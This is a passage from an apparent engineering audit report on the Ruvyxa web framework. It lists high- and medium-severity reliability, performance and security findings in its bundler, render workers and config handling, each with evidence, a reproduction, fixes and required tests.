      return Ok(ResolvedDependencies { paths: dependencies.to_vec(), aliases: BTreeMap::new() });
  }
  ```

  One hundred and thirty lines above, the _persistent_ cache refuses to do exactly this and says
  why: "Paths and aliases are one answer: the linker consults the alias map first and only then
  matches by path suffix, and an alias like `~/components/Button` shares no suffix with its target."
  `DepIndex::resolve` behaves exactly as described, so the alias-less lookup returns `None`.

- **Reproduction path:** A project whose `tsconfig.json` declares `"~/*": ["./*"]` (as
  `examples/demo` already does), with `components/shared.tsx` containing
  `import { x } from '~/lib/x'`, imported from two routes. On a cold `ruvyxa build`, route A records
  the alias and route B hits `cache.dependencies` and receives `aliases = {}`.
- **Root cause:** Two caches answer the same question with different completeness contracts. The
  persistent one stores `aliases: Option<…>` precisely so "never recorded" and "recorded empty" stay
  distinguishable; the in-memory one has no such field and fabricates an empty map instead of
  missing.
- **Impact:** Two compounding effects. **Wrong output, no build error** — every `tsconfig` `paths`
  alias fails `DepIndex::resolve` in every route but the first, and the linker either hoists it as a
  top-level external import no browser can resolve (killing the whole bundle) or routes it into the
  RUV1610 stub path. **The empty map outlives the build** — `record_module` stores
  `aliases: Some({})`, which passes the `Option` guard next time, so every route reuses it from then
  on; which route wins is decided by parallel completion order, so the corruption is
  nondeterministic. `examples/demo` declares `~/*` but no source uses it, so CI never exercises
  this.
- **Recommended fix:** Change `ResolveGraphCache::dependencies` to store the whole
  `ResolvedDependencies` and return both halves on a hit. Do **not** fix it by making
  `record_module` skip alias-less entries — that hides the primary defect while leaving route B's
  link broken.
- **Regression risk:** Low. The cache grows by one small `BTreeMap` per distinct (base_dir, source)
  pair — the same map the cold path already builds. `ResolveCacheStats::stats()` undercounts the new
  bytes until its `dependency_bytes` arm is updated, affecting only the cache-budget heuristic.
- **Required tests:** Extend `shared_graph_cache_reuses_source_reads_across_routes` — which today
  asserts only entry _counts_ — so the shared module carries a `tsconfig` alias import and both
  routes are asserted to see the same `dependency_aliases`. Add a second test driving
  `record_module` and asserting the persisted entry's aliases are non-empty.

---

### RUV-H13 — `import.meta.env` is never substituted in `.js`/`.mjs`/`.cjs` by the Rust compiler, while `compiler.mjs` substitutes every module

- **Severity:** High · **Category:** Reliability (two module graphs) · **Subsystem:** Bundler
  front-end (`BUNF-02`)
- **Affected files:** `crates/ruvyxa_bundler/src/compiler.rs:430`, `:633`, `:681`;
  `packages/ruvyxa/runtime/compiler.mjs:4265`
- **Confidence:** CONFIRMED
- **Evidence:** The Rust compile path returns before the transform for plain JavaScript
  (`compiler.rs:430`), and substitution lives only inside the transform (`:631`). The JavaScript
  graph runs **every** module through `transformModuleSource`, which always ends in
  `substitutePublicEnv(result.code)`. The repository already believes the invariant that is broken
  here — `crates/ruvyxa_cli/src/tests.rs:2251` states "`import.meta.env` is substituted into every
  module the compiler emits."
- **Reproduction path:** `app/page.js` (plain JavaScript) containing
  `import.meta.env.RUVYXA_PUBLIC_API_URL` — or, more realistically, any Vite-authored dependency
  whose shipped `.mjs` contains an `import.meta.env.DEV` guard. `ruvyxa dev` (JS graph) renders it;
  the client bundle from `ruvyxa build` (Rust graph) keeps the expression verbatim.
- **Root cause:** The substitution was implemented as a step of the oxc transform rather than as a
  step of "producing a compiled module", and the fast path for already-plain JavaScript bypasses the
  transform wholesale. The two graphs split on file extension, which is invisible in every test that
  uses `.ts`/`.tsx` fixtures.
- **Impact:** In the emitted browser bundle `import.meta` has no `env` property, so
  `import.meta.env.X` throws `TypeError` at module evaluation — killing the bundle, not just the
  expression. This hits projects writing plain `.js`/`.mjs` app code and any client-bundled
  `node_modules` dependency authored for Vite: for the Client target `node_modules` modules are
  **not** external, so their `.mjs` files take exactly this path.
- **Recommended fix:** Apply `substitute_public_env` to the `js|mjs|cjs` fast-path result before
  constructing the `CompiledModule` (wrap the `expand_multi_statement_esm` result at
  `compiler.rs:443`). `substitute_public_env` already short-circuits on `!code.contains(MARKER)` and
  masks text through `ast::masked_code`, so this costs one substring scan for the overwhelming
  majority of modules.
- **Regression risk:** Low, but it makes the emitted bytes of `.js` dependencies depend on
  `PUBLIC_ENV`. The compile cache for this path is not consulted at all, so no stale-key hazard is
  introduced, and the artifact hash already keys on `.env` content.
- **Required tests:** A Rust test running the fast-path branch over a `.mjs` source containing
  `import.meta.env.RUVYXA_PUBLIC_X` and asserting the marker is gone. Better: an `importMetaEnv`
  section in a shared fixture listing the extensions that must be substituted, replayed from both
  `compiler.rs` and a JS test over `substitutePublicEnv`.

---

### RUV-H14 — The route graph's private import resolver substitutes extensions instead of appending, dropping edges the bundler follows

- **Severity:** High · **Category:** Reliability (two module graphs) · **Subsystem:** `ruvyxa_graph`
  (`GMDT-02`)
- **Affected files:** `crates/ruvyxa_graph/src/lib.rs:1131-1153`;
  `crates/ruvyxa_bundler/src/resolver.rs:2246-2276`; `crates/ruvyxa_cli/src/build.rs:973-976`
- **Confidence:** CONFIRMED
- **Evidence:** `resolve_relative_import` builds its candidates with `Path::with_extension`, which
  **replaces** the last dotted segment. The bundler's resolver does the opposite and its doc comment
  names this precise mistake: "`./util.inspect` becomes `util.js`, which does not exist, while
  `util.inspect.js` … is never probed. Node appends; it does not replace." Two gaps follow: a dotted
  basename (`./db.config` backed by `db.config.ts`) is never probed, and `mts`, `cts`, `mjs`, `cjs`
  are absent from the graph crate's list entirely.
- **Reproduction path:** Add `lib/data.config.ts` exporting a loader that calls `fetch(...)`, import
  it from a page as `'../../lib/data.config'`, then `ruvyxa build` and `start`. The bundler resolves
  and compiles it; the graph does not, so it is absent from `reachable_project_modules` and never
  staged.
- **Root cause:** A third module resolver in a repository whose stated architecture has two, written
  independently and reaching the conclusion the bundler explicitly documents as wrong.
- **Impact:** Three consequences from one missing edge. **A production 500** —
  `reachable_project_modules` decides what `ruvyxa build` copies into `<out>/server/`, so a missed
  module is not copied and `ruvyxa start` answers a request-time render with
  `RUV1801 cannot resolve '…'` naming a path under `.ruvyxa` the author never wrote. **A silently
  wrong rendering strategy** — a dependency with no edge cannot be cleared of
  `fetch(`/`process.env.`, so the route is pre-rendered at build time and serves stale data.
  **Boundary checks that do not run** — `validate_app` walks this graph for RUV1007/1008/1010, so
  `ruvyxa check` reports clean; bounded because `boundary.rs` enforces the same three codes over its
  own correct graph during the client bundle, but `check` is the gate CI runs.
- **Recommended fix:** Delete `resolve_relative_import` and call the bundler's resolver —
  `ModuleCache::aliases()` already depends on `ruvyxa_bundler::resolver`, so the crate boundary is
  not the obstacle. If the entry point is not public enough, export
  `resolve_file_candidate`/`with_appended_extension` and `PROBE_EXTENSIONS` so one probe order
  serves both walks.
- **Regression risk:** The bundler probes a `.ts` source _before_ the exact written path for
  `.js`/`.mjs`/`.cjs`/`.jsx` specifiers, while this function probes the exact path first — adopting
  the bundler's order can change which file a `./x.js` specifier resolves to in a project shipping
  both `x.js` and `x.ts`, which makes the graph agree with what actually compiles. The reachable set
  also grows, so expect previously-hidden RUV1007/1008/1010 diagnostics on real projects: correct
  but noisy on the first run.
- **Required tests:** Beside `an_aliased_import_is_followed_like_a_relative_one`: a `./db.config`
  case backed by `db.config.ts` and a `./queue` case backed by `queue.mjs`, asserting both appear in
  `reachable_project_modules` and that a `fetch(` inside them keeps the route SSR. Better, extend
  `tests/fixtures/module-resolution-conformance.json` — which already has a `fileProbe` section the
  bundler replays — with a third replay from this crate.

---

### RUV-H15 — A slow render kills the worker process and every unrelated request on it, because the Rust deadline strictly encloses the worker's own

- **Severity:** High · **Category:** Reliability · **Subsystem:** Render workers (`DEVC-01`)
- **Affected files:** `crates/ruvyxa_dev_server/src/worker_pool.rs:1076`, `:1293`, `:1338`, `:561`,
  `:1811`, `:593-612`; `packages/ruvyxa/runtime/worker-pool.mjs:119`, `:303`
- **Confidence:** CONFIRMED
- **Evidence:** `Worker::send` bounds the whole request with one timeout and returns `Err` for a
  timeout exactly as it does for a dead pipe. Any `Err` replaces the worker
  (`worker_pool.rs:1080-1092`), and replacement calls `failed.shutdown()`, which drops every sibling
  request's sender (`:562-565`). The two deadlines are the _same number_: Rust writes
  `WORKER_TIMEOUT_ENV` and waits the same duration, but the Rust clock starts when the line is
  queued to stdin while the worker's clock starts only after the line has been read, parsed, and
  admitted through the concurrency gate (`worker-pool.mjs:304-330`).
- **Reproduction path:** `ruvyxa dev`, a page whose server render sleeps 31 s, requested
  concurrently with a second fast page. Both fail — the second with "Worker response channel closed
  unexpectedly" — and the worker's pid changes.
- **Root cause:** The Rust interval `[queued, answered]` strictly contains the worker interval
  `[admitted, answered]`, so `WORKER_REQUEST_TIMEOUT_MS` can never fire first and the worker's own
  watchdog — whose entire purpose is to answer a wedged render with `RUV1700` instead of dying — is
  unreachable on the pooled path. Compounding it, `send` treats "timed out" and "transport failed"
  as one condition, and `shutdown` is a whole-process operation.
- **Impact:** In `ruvyxa start` one slow route takes down every concurrent request sharing that
  worker — up to `MAX_CONCURRENT_REQUESTS` per event, half the live traffic at the minimum pool size
  of 2. Idempotent requests are silently re-rendered on a fresh process, doubling work exactly when
  the server is already overloaded; non-idempotent ones return 500 with no diagnosis. Because the
  retry re-adds load, this is a cascading-failure shape. It also destroys in-flight streamed API
  bodies mid-response.
- **Recommended fix:** (a) Give the Rust response timeout headroom over the worker's — keep the
  value written into the child's env but wait `response_timeout + WORKER_TIMEOUT_GRACE` on the Rust
  side, so the worker's own watchdog answers first with an ordinary `ok: false` frame. (b)
  Distinguish the two failure modes in `Worker::send` (a typed error, not `RuvyxaError::Message`) so
  `replace_failed_worker` is called only when the channel actually closed.
- **Regression risk:** A genuinely wedged worker (event loop blocked, so its own `setTimeout` never
  runs) is replaced one grace period later instead of immediately, holding its pending entries
  during that window. Bound it: replace after N consecutive timeouts, or when the worker misses a
  `Ping`.
- **Required tests:** A stub worker answering request A after a delay longer than the Rust timeout
  and request B immediately; assert B succeeds and `pool.workers[0]` is still the same `Arc`. A
  second test asserting `configure_worker_timeout` returns a Rust deadline strictly greater than the
  value it writes into the env.

---

### RUV-H16 — A client disconnect never reaches the worker; an abandoned streamed response runs forever while the pool counts it as idle

- **Severity:** High · **Category:** Reliability · **Subsystem:** Render workers (`DEVC-02`)
- **Affected files:** `crates/ruvyxa_dev_server/src/worker_pool.rs:321`, `:219`, `:552`;
  `crates/ruvyxa_dev_server/src/worker_protocol.rs:33`;
  `crates/ruvyxa_dev_server/src/render_pipeline.rs:1598`;
  `packages/ruvyxa/runtime/worker-pool.mjs:499`
- **Confidence:** CONFIRMED
- **Evidence:** `WorkerBodyStream::drop` removes the local bookkeeping entry and nothing else. There
  is no cancel or abort variant anywhere in `WorkerRequest`, and the worker builds its `Request`
  with no `signal`. The worker's stream loop is bounded only by _idle_ time between chunks.
  Meanwhile the pool's load metric is exactly the pending map the drop just emptied:
  `fn in_flight(&self) -> usize { self.pending.len() }`.
- **Reproduction path:** An SSE route under `app/api/` that writes a heartbeat every second and
  never closes; `curl -N` it, then Ctrl-C. The worker keeps producing chunks (each frame is read,
  finds no pending entry, and is discarded). Repeat once per worker and the pool is fully occupied
  while `select_worker` reports every worker idle.
- **Root cause:** Cancellation is not part of the NDJSON protocol. The Rust side models "this
  request is over" as removing the local entry — a statement about the host's bookkeeping only. The
  worker's idle watchdog bounds a _stalled_ stream but not an _actively producing_ one, which is
  exactly the shape of SSE, long-poll, and any streamed document whose reader walked away.
- **Impact:** **Worker exhaustion** — N abandoned long-lived streams pin N worker processes in an
  infinite produce loop, and because the pending entry is gone the least-loaded selection routes
  _more_ work onto exactly those processes. **Load-metric corruption** — `in_flight` systematically
  under-reports on any host serving streams, which mis-drives `retire_worker_if_saturated` and makes
  `drain_then_shutdown` believe a busy worker is idle. Reachable by any anonymous client on
  `ruvyxa start`, so it is also a cheap denial of service.
- **Recommended fix:** Add a `cancel { id }` request to `WorkerRequest`, send it from
  `WorkerBodyStream::drop` (and from a `Drop` guard around the non-streaming `Worker::send` await)
  through the existing non-blocking `try_send`, and on the worker side keep an `AbortController` per
  in-flight id, abort it on `cancel`, and pass its `signal` into the `Request` the route handler
  receives. Until that lands, the smaller mitigation is to keep the pending entry — and therefore
  `in_flight` — until the worker sends a terminal frame, so an abandoned stream at least stops
  attracting new work.
- **Regression risk:** A `cancel` for an already-answered id must be a no-op, and the abort must not
  reach a retried request that reused an id (ids come from a monotonic counter, so reuse cannot
  happen — worth asserting). Passing a real `signal` to user handlers changes observable behaviour
  for routes that inspect it.
- **Required tests:** A stub worker that streams forever; build the body, drop it, assert the worker
  receives a `cancel` frame for that id. An integration test that drops a streamed API response and
  asserts the worker's `ping` reports `activeRequests: 0` afterwards.

---

### RUV-H17 — `image.maxWidth` is documented, typed, and implemented, but the config renderer refuses it — every command fails for a project that sets it

- **Severity:** High · **Category:** Reliability (config-surface parity) · **Subsystem:** CLI config
  - runtime config schema (`CLIC-01`, reported independently from the JS side as `RTMC-05`)
- **Affected files:** `crates/ruvyxa_cli/src/image_optimizer.rs:95`;
  `crates/ruvyxa_cli/src/config.rs:64`; `packages/ruvyxa/runtime/config-schema.mjs:69`;
  `packages/ruvyxa/runtime/config-renderer.mjs:124`, `:253`;
  `packages/@ruvyxa/core/src/types.ts:356`
- **Confidence:** CONFIRMED
- **Evidence:** Rust declares `pub max_width: u32` with a default of 3840 and a documented `0`
  escape hatch, under `#[serde(rename_all = "camelCase")]` so the wire name is `maxWidth`. The
  public type declares `maxWidth?: number` with `@default 3840`. `CONFIG_KEY_SCHEMA['config.image']`
  does not list it, and `assertKnownKeys(config.image, 'config.image')` throws
  `RUV1602 unknown config.image field: maxWidth` before anything else touches the block. Even past
  that check, `imageValue()` rebuilds the block field by field and would drop it.
- **Reproduction path:** Put `image: { maxWidth: 1920 }` in `ruvyxa.config.ts` and run any command.
  `load_project_config` bails with `RUV1602`. `dev`, `build`, `start`, `check`, `routes`, `analyze`,
  `doctor`, `clean`, `bench`, `test:parity` and `add` all load the config first, so all of them
  fail.
- **Root cause:** The config surface has three descriptions — `ProjectConfig` (Rust),
  `CONFIG_KEY_SCHEMA` (JS), `RuvyxaConfig` (TS) — and only the JS↔TS pair is gated.
  `config-schema.test.ts` compares the schema against a **hand-written** literal whose `image` block
  omits `maxWidth` too, so a key present in the Rust struct and the TS type but absent from both the
  schema and the literal is invisible to it. Nothing anywhere compares `ProjectConfig`'s serde field
  set against `CONFIG_KEY_SCHEMA`.
- **Impact:** A project that follows `ARCHITECTURE.md`, the changelog, or the IDE autocompletion
  that `RuvyxaConfig` drives cannot run Ruvyxa at all until it deletes the key. The cap is also
  permanently pinned at 3840 for every project: the documented `0` (publish full resolution) and
  raised-cap cases are unreachable, so a project publishing 6000px originals silently ships 3840px
  ones with no way to opt out.
- **Recommended fix:** Add `'maxWidth'` to `CONFIG_KEY_SCHEMA['config.image']`, add
  `maxWidth: numberValue(image?.maxWidth)` to `imageValue`, and add `maxWidth: 3840` to the
  `authored` literal in the test. Then close the ungated pair: emit `ProjectConfig`'s serde field
  set (and each nested struct's) to a fixture and assert `CONFIG_KEY_SCHEMA` equals it in **both**
  directions.
- **Regression risk:** Low for the schema/renderer edit — it only widens what is accepted, and Rust
  has always been able to read the key. The new Rust↔JS test may fail immediately on other fields;
  each such failure is another instance of this same finding, not a broken test.
- **Required tests:** The Rust↔JS field-set fixture above, plus an end-to-end case rendering a
  config containing `image.maxWidth` and asserting the value reaches
  `ProjectConfig.images.max_width`.

---

### RUV-H18 — `check-cross-language-constants.mjs` compares only the first JS copy, leaving the deployed runtime's copy of three shared constants ungated

- **Severity:** High · **Category:** Reliability · **Subsystem:** Repo-wide gates (`DEP-01`)
- **Affected files:** `scripts/check-cross-language-constants.mjs:236-259`;
  `packages/ruvyxa/runtime/adapter-runner.mjs:48`, `:60`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:252`;
  `packages/@ruvyxa/core/src/deploy-manifest.ts:42`, `:51`, `:141`
- **Confidence:** CONFIRMED
- **Evidence:** The declaration map is first-write-wins (`if (… found.has(name)) continue`), and
  `tracked` comes from `git ls-files`, which emits `packages/@ruvyxa/…` (`@` = 0x40) before
  `packages/ruvyxa/…` (`r` = 0x72). Three registered names are declared twice on the JS side and the
  _uncompared_ copy is the one that decides behaviour at deploy time: `DEPLOY_MANIFEST_KEY` and
  `DEPLOY_MANIFEST_VERSION` (`adapter-runner.mjs:214`, `:221`) and `DEFAULT_REVALIDATE_SECONDS`
  (`serverless-handler.mjs:287`).
- **Reproduction path:** Raise `deploy_manifest.rs:55` and `deploy-manifest.ts:51` to `2`, leave
  `adapter-runner.mjs:60` at `1`, run the check. It prints "all 29 are held" and exits 0. Every
  deployed build then writes `version: 2` and the adapter runner refuses it.
- **Root cause:** The gate models "a fact written in two languages" as "a name declared in Rust and
  a name declared in JavaScript", and collapses the JavaScript side to one declaration. The
  repository's actual shape is three copies (Rust writer, `@ruvyxa/core` typed reader,
  `packages/ruvyxa/runtime` executed reader) — and unlike the `defaultMaxWidth` case the file's own
  header says it cannot see, these copies _are_ named, so the gate could see them and deliberately
  discards them.
- **Impact:** The single mechanism holding the deploy-manifest contract together is blind to the
  copy that enforces it. A developer who correctly updates "both halves" and misses the third file
  ships a release in which every deployed build is rejected by its own adapter runner, or in which
  ISR routes revalidate on one schedule under `ruvyxa start` and another once deployed.
  `pnpm release:validate` stays green throughout.
- **Recommended fix:** Collect **every** declaration per name (`Map<string, Array<{file, value}>>`)
  and, for `sameValue` entries, require all Rust values and all JS values to normalize equal. Report
  the file list in the failure message. Replace the `found.has(name)` guard with de-duplication at
  comparison time, not collection time.
- **Regression risk:** Names that legitimately repeat with different values inside one language
  would start failing; the registry already has an `unrelated` kind for that, and moving them there
  is the correct outcome. All three copies above currently agree, so the fix lands green.
- **Required tests:** A unit test for `declarations()` asserting a name declared in two JS files
  yields two entries, plus a fixture-driven negative test that a divergent second copy is reported.
  There is no test for this script today.

---

# Medium

Fifty-six findings, grouped by subsystem so they can be batched. Each keeps its subsystem ID.

## Bundler front-end

### BUNF-04 — Rust resolves bare specifiers against the project root; `compiler.mjs` does not

- **Category:** Reliability (two module graphs) · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_bundler/src/resolver.rs:2017`, `:2136`;
  `packages/ruvyxa/runtime/compiler.mjs:1507`
- **Evidence:** Rust inserts `resolve_project_specifier` — which joins a _bare_ specifier onto the
  project root — between `tsconfig` and `node_modules`. `resolveLocalSpecifier` returns `null` for
  anything neither relative nor absolute, so the JS graph has no such step.
- **Reproduction:** `<root>/utils/index.ts` in a project that also has a dependency named `utils`,
  with `import { x } from 'utils'`. The client bundle takes the project file; `ruvyxa dev` and every
  prerender worker take `node_modules/utils`.
- **Root cause:** One graph grew a convenience rule the other never learned. Neither the fixture nor
  a doc comment names the step, so there was nothing to notice was missing.
- **Impact:** The two graphs compile different files for one import, with no diagnostic from either
  — the browser bundle and the server render can contain genuinely different modules. The Rust
  branch also bypasses the RUV1807 case check, which is gated on `specifier.starts_with('.')`.
- **Fix:** Decide the rule and write it into `tests/fixtures/module-resolution-conformance.json` as
  a new `resolutionOrder` section both hosts replay. The reading here is that the Rust step should
  go — `baseUrl` already provides project-root-relative behaviour in both graphs through
  `TsConfigPaths`.
- **Regression risk:** Removing the step breaks any project relying on it _silently_ (the specifier
  becomes an unresolved external — see BUNF-07). Land the fixture first so both hosts move together.
- **Tests:** A `resolutionOrder` fixture replayed by Rust and by a JS test over
  `resolveSpecifierPath`: project directory shadowing an installed package; project directory with
  no package; neither.

### BUNF-05 — Every module pays a full source scan for `import.meta.glob`, and a glob's directory walk repeats per route

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_bundler/src/glob.rs:22`, `:198`;
  `crates/ruvyxa_bundler/src/resolver.rs:1758`, `:1799`
- **Evidence:** `expand_import_meta_glob` calls `ast::parse_module(source)` unconditionally before
  searching for the marker, with no `if !source.contains(MARKER)` guard — even though the two
  neighbouring passes using the same scanner both have one.
- **Reproduction:** Measurable with `ruvyxa build --root examples/demo` under a profiler, comparing
  `ast::parse_module` call counts before and after adding the guard.
- **Root cause:** The pass parses first and searches second; the scanner's facts are needed only to
  answer `is_code_offset` for marker positions, so the parse is dead work whenever the marker is
  absent — which is essentially every module.
- **Impact:** One redundant full byte scan of every module, for every route, on top of the scan
  `collect_deps_uncached` already performs on the same text. For a 50-route app with an 800-module
  client graph that is tens of thousands of avoidable scans including the largest `node_modules`
  files. The glob directory walk is a second, larger N+1: a content site globbing
  `./content/**/*.md` re-walks that tree once per route and pays it again on every incremental
  rebuild, because a non-empty `watch_roots` disables persistent dependency-edge reuse.
- **Fix:** Add the marker guard as the first statement of `expand_import_meta_glob`. Separately,
  memoize `collect_matches` per `(absolute_pattern, watch_root)` in `ResolveGraphCache` for the life
  of a build.
- **Regression risk:** The guard is behaviour-preserving. Memoizing the walk is riskier in `dev`,
  where a file can appear between routes — key the memo on `ResolveGraphCache` (which `dev`
  recreates or invalidates), not on a process global.
- **Tests:** A counter-based test so the guard cannot be removed silently.

### BUNF-06 — `build_reference_manifest` does a linear scan inside the client-closure BFS, making it O(n²) per route

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_bundler/src/references.rs:58`, `:70`
- **Evidence:** `while let Some(path) = pending.pop_front()` followed by
  `modules.iter().find(|module| module.path == path)` — an O(n) `PathBuf` comparison per iteration,
  over a queue seeded with every `Client`-lane module and grown by every promoted `Shared` one.
- **Reproduction:** Time `ruvyxa build` on a project with a few thousand client-lane modules and
  many routes.
- **Root cause:** A `Vec<CompiledModule>` used as a lookup table inside a BFS. The lane map is
  already built one line above from the same slice, so the index exists in spirit.
- **Impact:** Wall-clock build time only — no incorrect output. It scales quadratically with module
  count _and_ linearly with route count, so it is the shape that turns a comfortable build into an
  unacceptable one as an app grows, and it is invisible on the small fixtures the tests use.
- **Fix:** Build `BTreeMap<&Path, &CompiledModule>` once before the loop and look up through it.
- **Regression risk:** None — the lookup is by exact path equality either way and iteration order is
  unchanged, so the emitted manifest and its `artifact_version` hash are byte-identical.
- **Tests:** `client_lane_owns_shared_closure_and_manifest_is_stable` already pins the output and is
  sufficient to guard the refactor.

### BUNF-07 — Neither graph implements package `imports` (`#…`) or self-reference, and an unresolved bare specifier is silently dropped

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_bundler/src/resolver.rs:1395`, `:1164`, `:2080`;
  `packages/ruvyxa/runtime/package-exports.mjs`
- **Evidence:** `PackageManifest` reads only `exports`, `browser`, `module`, `main` — there is no
  `imports`. `package_name_and_export_key` treats `#internal/db` as package `#internal` with key
  `./db`, which matches nothing, and the specifier then reaches
  `if !specifier.starts_with('.') { continue }` — treated as external, silently.
- **Reproduction:** A dependency declaring `"imports": { "#dep": "./src/dep.js" }` whose shipped
  code imports `#dep`. `ruvyxa build` produces a client bundle carrying a hoisted
  `import … from "#dep"` with no build error; the browser fails to load the module.
- **Root cause:** The `exports` half of Node resolution was implemented carefully and fixture-held;
  the `imports` half and self-reference were not, and the "unknown bare specifier is external"
  fallback converts the gap into silence rather than a diagnostic.
- **Impact:** A whole class of modern dependencies cannot be client-bundled, and the failure arrives
  in the browser rather than at build time. Both graphs share the gap, so no cross-graph test can
  catch it.
- **Fix:** Two independent changes. (1) Add `imports` to `PackageManifest` and resolve a `#`
  specifier against the importing package's nearest `package.json` using the existing
  `resolve_exports_entry` machinery; mirror in `package-exports.mjs` and add an `imports` fixture
  section. (2) Independently, make the silent-drop branch emit a warning naming the specifier and
  the importer when `target == BundleTarget::Client`.
- **Regression risk:** (2) is the risky half — projects legitimately rely on `build.external` and on
  marker packages (`server-only`, `client-only`) reaching this branch. Exempt
  `linker::is_marker_package` and anything in `build.external`, and ship it as a diagnostic, not an
  error.
- **Tests:** An `imports` fixture section replayed by both hosts; a Rust test with a temp package
  declaring `"imports"`; a test asserting the new diagnostic fires for an unresolvable bare
  specifier in a Client bundle but not for `server-only`.

## Bundler back-end

### BUNB-03 — The persisted artifact graph is never pruned, so `artifact-graph.json` grows monotonically

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_bundler/src/task_graph.rs:454-479`, `:200-228`, `:499-560`, `:677-696`;
  `crates/ruvyxa_bundler/src/context.rs:111-146`
- **Evidence:** `save()` persists every record in memory with no filter; the only removal is
  `evict_to_bytes`, which runs after a soft memory limit is crossed. Nothing prunes a superseded
  generation. `IncrementalGraphCache::save` by contrast filters on `path.exists()`.
- **Reproduction:** Run `ruvyxa build` repeatedly with a one-line edit between runs and watch
  `.ruvyxa/cache/bundler/artifact-graph.json` grow; `stats().records` never decreases.
- **Root cause:** The graph has invalidation and eviction but no retention policy, and eviction is
  driven by a byte estimate (~150–200 bytes/record) three to four times smaller than the JSON
  encoding — so the file reaches roughly 500 MB before the accounting reports 256 MiB of pressure.
- **Impact:** A long-lived project or CI cache directory accumulates a manifest parsed in full at
  the start of every build and re-serialised at the end, so both ends get steadily slower and the
  directory grows without a bound the user can see. `ruvyxa clean` is the only reclaim.
- **Fix:** Give `save()` a retention rule: stamp a monotonically increasing build epoch on every
  record touched by `begin`/`publish` and drop records not touched in the last N epochs (3 keeps a
  warm cache across a branch switch). Reuse `is_evictable` so a pinned closure is never written
  away.
- **Regression risk:** Dropping a record the next build would have hit turns a hit into a rebuild,
  which `evict_to_bytes` already documents as safe. The rule must not drop a record another still
  depends on.
- **Tests:** Publish N generations of one lane across simulated builds and assert the reloaded
  record count is bounded rather than N.

### BUNB-04 — The artifact graph and the incremental graph reuse entries across compiler versions; the compile cache beside them does not

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_bundler/src/task_graph.rs:17`, `:271-283`;
  `crates/ruvyxa_bundler/src/incremental.rs:39`, `:325-335`;
  `crates/ruvyxa_bundler/src/cache.rs:44`; `crates/ruvyxa_bundler/src/lib.rs:558-579`
- **Evidence:** `cache.rs:44` folds `env!("CARGO_PKG_VERSION")` into every key and says why. Its two
  neighbours do not: `ARTIFACT_GRAPH_IDENTITY = "ruvyxa_artifact_graph"` and
  `MANIFEST_VERSION = "ruvyxa_graph_cache"`, scoped only by a namespace derived from the _project_.
  A `Transform` artifact's content hash is the compiler's output while its key is not, and `publish`
  fails closed on a mismatch with `NonDeterministicOutput`.
- **Reproduction:** `cargo run -p ruvyxa_cli -- build --root examples/demo`, change the transform in
  `compiler.rs`, build again. The namespace is identical, the old `Ready` records are still there,
  and the build fails with "artifact … produced two different outputs in one generation" until the
  cache directory is deleted. Real mitigation: `pnpm add ruvyxa@latest` rewrites `package.json` and
  the lockfile, both of which feed the namespace — so the failure is confined to paths where the
  binary moves and the manifest does not, which includes every contributor's own loop.
- **Root cause:** The identity of a cache must cover everything that decides its content. These two
  store answers produced by the Rust compiler and resolver and cover only the project. Both doc
  comments argue correctly against a _hand-maintained_ counter and then omit the derived component
  the compile cache twelve files away already uses.
- **Impact:** (a) a sticky, self-inflicted hard build failure surviving across runs whose message
  names an artifact identity and nothing actionable; (b) silently stale dependency edges after a
  resolver change — the two-module-graphs failure mode in slow motion.
- **Fix:** `concat!("ruvyxa_artifact_graph:", env!("CARGO_PKG_VERSION"))` and the same for
  `MANIFEST_VERSION`. Both are already compared for exact equality on load, so a version change
  becomes a clean cold start rather than a poisoned graph.
- **Regression risk:** Every release discards every user's warm graph once — one cold build per
  upgrade, which the compile cache already imposes for the same reason. No correctness risk.
- **Tests:** Replace `the_manifest_identity_carries_no_version_counter`'s literal assertion with one
  asserting the identity contains `CARGO_PKG_VERSION` and no hand-written `vN` segment; add a
  `task_graph` test that a manifest under a doctored identity loads as zero records.

### BUNB-05 — `write_atomic`'s rename-failure fallback is a non-atomic truncating write, and no reader validates what it reads

- **Category:** Reliability · **Confidence:** CONFIRMED (code path; fallback reachability is
  environment-dependent)
- **Files:** `crates/ruvyxa_bundler/src/atomic_file.rs:58-78`, `:22-25`;
  `crates/ruvyxa_bundler/src/cache.rs:276-289`
- **Evidence:** On a `rename` failure the fallback is `fs::write(path, bytes)`, which truncates then
  writes. The module header claims the race is unobservable "because every caller here writes
  content-addressed entries" — but two of the four callers write fixed-path manifests whose contents
  differ every build, and the caller that _is_ content-addressed keys on a hash of the **source**,
  not of the stored bytes, and performs no length, checksum, or terminator check on read.
- **Reproduction:** Force a rename failure (an open handle without `FILE_SHARE_DELETE`, or a
  cross-device cache dir) and read concurrently.
- **Root cause:** The fallback trades atomicity for liveness and documents the trade as costless,
  which holds only under an assumption two of its callers break, and only if readers verify bytes,
  which none do.
- **Impact:** For the two manifests a torn read is caught by `serde_json` and degrades to a cold
  cache — fail-soft and acceptable. For the compile cache a torn read is accepted as a **hit** and
  becomes the module's compiled body: either a bundle that fails to parse in a stage that cannot
  name the file, or a silently incomplete module. Needs two processes sharing a cache directory plus
  a rename failure, so it is rare; the cost when it happens reproduces only on one machine.
- **Fix:** (1) Fall back only for `ErrorKind::CrossesDevices`; for everything else retry the rename
  a bounded number of times (a Windows sharing violation is transient), and correct the module
  header. (2) Make the cache entry self-describing — write `blake3(compiled_js)` as a header line in
  `store` and verify it in `lookup`, treating a mismatch as a miss, which is the behaviour the cache
  is already designed around.
- **Regression risk:** The header changes the on-disk format, so every existing entry misses once —
  harmless and self-correcting. Keep the retry ceiling small (three) so a genuinely unwritable
  target still reports promptly.
- **Tests:** In `atomic_file.rs`, that a cross-device-style failure still publishes and a
  non-cross-device one is retried rather than falling back. In `cache.rs`, that a truncated
  `<key>.js` returns `Miss`.

## Dev/production server request path

### DEVR-01 — The dev-only HMR WebSocket is registered and reachable in `ruvyxa start`

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/lib.rs:1302`, `:1328`;
  `crates/ruvyxa_dev_server/src/realtime_endpoints.rs:32`;
